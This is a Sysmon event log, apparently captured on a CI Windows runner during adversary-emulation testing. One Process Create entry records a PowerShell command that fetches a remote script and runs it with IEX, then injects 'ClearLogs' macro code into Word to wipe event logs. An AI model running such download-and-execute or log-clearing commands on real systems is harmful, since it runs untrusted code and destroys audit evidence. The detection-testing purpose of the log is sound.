"TimeCreated","Id","Message"
"12/17/2025 8:29:03 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:29:01.924
ProcessGuid: {f995aebf-69cd-6942-450a-000000000e00}
ProcessId: 6856
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:29:02 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:29:01.928
ProcessGuid: {f995aebf-69cd-6942-450a-000000000e00}
ProcessId: 6856
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54269
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:28:04 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:28:02.817
ProcessGuid: {f995aebf-6992-6942-8609-000000000e00}
ProcessId: 7720
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54237
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:28:04 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:28:02.813
ProcessGuid: {f995aebf-6992-6942-8609-000000000e00}
ProcessId: 7720
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:25:56 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:25:54.508
ProcessGuid: {f995aebf-6912-6942-7909-000000000e00}
ProcessId: 9540
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54185
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:25:56 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:25:54.504
ProcessGuid: {f995aebf-6912-6942-7909-000000000e00}
ProcessId: 9540
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:45 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:23:43.705
ProcessGuid: {f995aebf-688f-6942-4209-000000000e00}
ProcessId: 8508
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:21:09 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:21:07.768
ProcessGuid: {f995aebf-67f2-6942-c608-000000000e00}
ProcessId: 6992
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:21:09 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:21:07.259
ProcessGuid: {f995aebf-67f2-6942-c608-000000000e00}
ProcessId: 6992
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:21:09 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:21:07.263
ProcessGuid: {f995aebf-67f2-6942-c608-000000000e00}
ProcessId: 6992
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54064
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:20:26 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:20:23.577
ProcessGuid: {f995aebf-67c6-6942-3208-000000000e00}
ProcessId: 3908
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54042
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.109.133
DestinationHostname: cdn-185-199-109-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:20:26 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:20:23.500
ProcessGuid: {f995aebf-67c6-6942-3208-000000000e00}
ProcessId: 3908
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54041
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 140.82.114.4
DestinationHostname: lb-140-82-114-4-iad.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:20:25 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:20:23.575
ProcessGuid: {f995aebf-67c6-6942-3208-000000000e00}
ProcessId: 3908
QueryName: release-assets.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:20:25 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:20:23.496
ProcessGuid: {f995aebf-67c6-6942-3208-000000000e00}
ProcessId: 3908
QueryName: github.com
QueryStatus: 0
QueryResults: ::ffff:140.82.114.4;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:20:24 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:20:23.395
ProcessGuid: {f995aebf-67c6-6942-3208-000000000e00}
ProcessId: 3908
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:54 AM","255","Error report:
UtcTime: 2025-12-17 08:19:54.063
ID: DriverCommunication
Description: Failed to retrieve events - Last error: The I/O operation has been aborted because of either a thread exit or an application request.
"
"12/17/2025 8:19:51 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:51.156
ProcessGuid: {f995aebf-67a7-6942-af07-000000000e00}
ProcessId: 3060
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xst5e2aa.psp.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:51 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:51.135
ProcessGuid: {f995aebf-67a7-6942-af07-000000000e00}
ProcessId: 3060
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xst5e2aa.psp.ps1
CreationUtcTime: 2025-12-17 08:19:51.135
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:50.769
ProcessGuid: {f995aebf-67a6-6942-ad07-000000000e00}
ProcessId: 5656
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hil53pui.h0s.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:50 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:50.747
ProcessGuid: {f995aebf-67a6-6942-ad07-000000000e00}
ProcessId: 5656
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hil53pui.h0s.ps1
CreationUtcTime: 2025-12-17 08:19:50.747
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:50.390
ProcessGuid: {f995aebf-67a6-6942-ab07-000000000e00}
ProcessId: 3900
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gcjwydjd.2qv.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:50 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:50.368
ProcessGuid: {f995aebf-67a6-6942-ab07-000000000e00}
ProcessId: 3900
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gcjwydjd.2qv.ps1
CreationUtcTime: 2025-12-17 08:19:50.368
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:49 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:49.995
ProcessGuid: {f995aebf-67a5-6942-a907-000000000e00}
ProcessId: 10176
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_g5fpfook.qfh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:49 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:49.973
ProcessGuid: {f995aebf-67a5-6942-a907-000000000e00}
ProcessId: 10176
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_g5fpfook.qfh.ps1
CreationUtcTime: 2025-12-17 08:19:49.973
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:43.644
ProcessGuid: {f995aebf-679f-6942-9d07-000000000e00}
ProcessId: 5192
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_w1scerab.q1a.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:43 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:43.622
ProcessGuid: {f995aebf-679f-6942-9d07-000000000e00}
ProcessId: 5192
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_w1scerab.q1a.ps1
CreationUtcTime: 2025-12-17 08:19:43.622
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:43.060
ProcessGuid: {f995aebf-679e-6942-9b07-000000000e00}
ProcessId: 9576
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_il54hikt.ezc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:43 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:43.039
ProcessGuid: {f995aebf-679e-6942-9b07-000000000e00}
ProcessId: 9576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_il54hikt.ezc.ps1
CreationUtcTime: 2025-12-17 08:19:43.039
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:42.460
ProcessGuid: {f995aebf-679e-6942-9907-000000000e00}
ProcessId: 7896
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yhjxle0q.o4m.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:42 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:42.438
ProcessGuid: {f995aebf-679e-6942-9907-000000000e00}
ProcessId: 7896
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yhjxle0q.o4m.ps1
CreationUtcTime: 2025-12-17 08:19:42.438
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:41 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:41.865
ProcessGuid: {f995aebf-679d-6942-9707-000000000e00}
ProcessId: 1004
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_it3p5ov0.m4k.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:41 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:41.843
ProcessGuid: {f995aebf-679d-6942-9707-000000000e00}
ProcessId: 1004
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_it3p5ov0.m4k.ps1
CreationUtcTime: 2025-12-17 08:19:41.843
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:38 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:38.824
ProcessGuid: {f995aebf-679a-6942-8f07-000000000e00}
ProcessId: 4460
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fwtm2pp0.j2z.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:38.800
ProcessGuid: {f995aebf-679a-6942-8f07-000000000e00}
ProcessId: 4460
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fwtm2pp0.j2z.ps1
CreationUtcTime: 2025-12-17 08:19:38.800
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:38 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:38.431
ProcessGuid: {f995aebf-679a-6942-8d07-000000000e00}
ProcessId: 5932
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kyak5jky.1hc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:38.411
ProcessGuid: {f995aebf-679a-6942-8d07-000000000e00}
ProcessId: 5932
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kyak5jky.1hc.ps1
CreationUtcTime: 2025-12-17 08:19:38.411
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:34 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:19:32.426
ProcessGuid: {f995aebf-6794-6942-8707-000000000e00}
ProcessId: 880
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54015
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:19:34 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:19:32.422
ProcessGuid: {f995aebf-6794-6942-8707-000000000e00}
ProcessId: 880
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:32 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:32.195
ProcessGuid: {f995aebf-6794-6942-8707-000000000e00}
ProcessId: 880
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rprirxys.i50.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:32 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:32.175
ProcessGuid: {f995aebf-6794-6942-8707-000000000e00}
ProcessId: 880
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rprirxys.i50.ps1
CreationUtcTime: 2025-12-17 08:19:32.175
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:32 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:32.092
ProcessGuid: {f995aebf-6794-6942-8707-000000000e00}
ProcessId: 880
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1070.001\src\T1070.001-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""ClearLogs\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:31 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:31.577
ProcessGuid: {f995aebf-6793-6942-8507-000000000e00}
ProcessId: 6664
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_3zbostxe.amh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
